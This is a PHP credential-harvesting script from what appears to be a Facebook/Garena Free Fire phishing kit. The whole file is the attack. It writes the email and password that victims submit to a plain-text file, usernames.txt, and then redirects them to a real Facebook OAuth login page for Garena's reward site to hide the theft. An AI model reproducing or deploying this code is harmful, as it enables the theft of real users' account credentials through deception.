<?php

file_put_contents("usernames.txt", " Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://m.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26redirect_uri%3Dhttps%253A%252F%252Fauth.garena.com%252Foauth%252Flogin%252Ffacebook%26response_type%3Dtoken%26scope%3Dpublic_profile%252Cemail%252Cuser_friends%26state%3Dresponse_type%25253Dtoken%252526locale%25253Dzh-TW%252526redirect_uri%25253Dhttps%2525253A%2525252F%2525252Freward.ff.garena.com%2525252F%252526client_id%25253D100067%252526all_platforms%25253D1%252526platform%25253D3%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dad24f7cb-70c0-4221-95a4-de44dc4c793a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.garena.com%2Foauth%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dresponse_type%25253Dtoken%252526locale%25253Dzh-TW%252526redirect_uri%25253Dhttps%2525253A%2525252F%2525252Freward.ff.garena.com%2525252F%252526client_id%25253D100067%252526all_platforms%25253D1%252526platform%25253D3%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr');
exit();
?>
